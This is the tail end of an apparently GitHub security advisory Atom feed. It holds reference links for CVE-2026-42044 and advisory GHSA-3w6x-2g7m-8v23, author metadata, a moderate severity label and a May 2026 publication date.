<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42044">https://nvd.nist.gov/vuln/detail/CVE-2026-42044</a></li>
<li><a href="https://github.com/advisories/GHSA-3w6x-2g7m-8v23">https://github.com/advisories/GHSA-3w6x-2g7m-8v23</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3w6x-2g7m-8v23</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:19:33.000Z</published>
    </entry>
</feed>